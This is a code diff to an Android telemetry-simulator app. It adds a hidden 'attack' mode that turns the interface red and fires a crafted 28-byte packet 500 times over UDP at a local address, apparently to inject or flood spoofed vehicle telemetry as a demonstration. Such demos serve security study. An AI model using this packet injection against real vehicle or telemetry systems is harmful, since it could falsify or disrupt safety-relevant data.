@@ -9,16 +9,18 @@ using Android.OS;
 using Android.Runtime;
 using Android.Views;
 using Android.Widget;
+using Android.Graphics;
 
 namespace TelemetrySim
 {
-    [Activity(Label = "TelemetryUI")]
+    [Activity(Theme = "@style/Theme.NoTitle")]
     public class TelemetryActivity : Activity
     {
         TextView textView_heading;
         TextView textView_coordinate_x;
         TextView textView_coordinate_y;
         TextView textView_acceleration;
+
         UdpState state;
         bool stop;
         bool busy_processing;
@@ -33,6 +35,7 @@ namespace TelemetrySim
 
         protected override void OnCreate(Bundle savedInstanceState)
         {
+            RequestWindowFeature(WindowFeatures.NoTitle);
             base.OnCreate(savedInstanceState);
             SetContentView(Resource.Layout.Telemetry_UI);
 
@@ -48,6 +51,13 @@ namespace TelemetrySim
             textView_coordinate_x = FindViewById<TextView>(Resource.Id.CoordinateX_text);
             textView_coordinate_y = FindViewById<TextView>(Resource.Id.CoordinateY_text);
             textView_acceleration = FindViewById<TextView>(Resource.Id.AccelerationData);
+
+            ImageButton attackButton1 = FindViewById<ImageButton>(Resource.Id.TireImageFL);
+
+            attackButton1.Click += (object sender, EventArgs e) =>
+            {
+                PrepAttack();
+            };
         }
 
         private void UpdateUI()
@@ -56,6 +66,52 @@ namespace TelemetrySim
             textView_coordinate_x.Text = coordinate_x.ToString();
             textView_coordinate_y.Text = coordinate_y.ToString();
             textView_acceleration.Text = acceleration.ToString();
+        }
+
+        private void PrepAttack()
+        {
+            View telemetry_activity = FindViewById(Resource.Id.activity_telemetry);
+            ImageButton tire_image_FL = FindViewById<ImageButton>(Resource.Id.TireImageFL);
+            ImageView tire_image_FR = FindViewById<ImageView>(Resource.Id.TireImageFR);
+            ImageView tire_image_RL = FindViewById<ImageView>(Resource.Id.TireImageRL);
+            ImageView tire_image_RR = FindViewById<ImageView>(Resource.Id.TireImageRR);
+            ImageButton attack_launch = FindViewById<ImageButton>(Resource.Id.LaunchButton);
+
+            telemetry_activity.SetBackgroundColor(Color.Red);
+            tire_image_FL.SetBackgroundColor(Color.Red);
+            tire_image_FR.SetBackgroundColor(Color.Red);
+            tire_image_RL.SetBackgroundColor(Color.Red);
+            tire_image_RR.SetBackgroundColor(Color.Red);
+
+            attack_launch.SetBackgroundColor(Color.Red);
+            attack_launch.Clickable = true;
+            attack_launch.Visibility = ViewStates.Visible;
+            attack_launch.Click += (object sender, EventArgs e) =>
+            {
+                LaunchAttack();
+            };
+
+
+        }
+
+        private void LaunchAttack()
+        {
+            byte[] message =   {  0x00, 0x00, 0x00, 0x06,
+                            0x00, 0x00, 0x00, 0x00,
+                            0x00, 0x00, 0x00, 0x00,
+                            0x00, 0x00, 0x00, 0x01,
+                            0x00, 0x00, 0x00, 0x00,
+                            0x00, 0x00, 0x00, 0x00,
+                            0x00, 0x00, 0x00, 0x00 };
+
+            UdpClient malicious_UDP_client = new UdpClient("192.168.1.74", 4282);
+
+            int count = 0;
+            while (count < 500)
+            {
+                malicious_UDP_client.Send(message, message.Length);
+                count++;
+            }
         }
 
         private void StartUDPlistener()
@@ -139,12 +195,6 @@ namespace TelemetrySim
             }
 
             RunOnUiThread(() => UpdateUI());
-
-
-
-
-
-
 
             busy_processing = false;
             if (receive_paused)
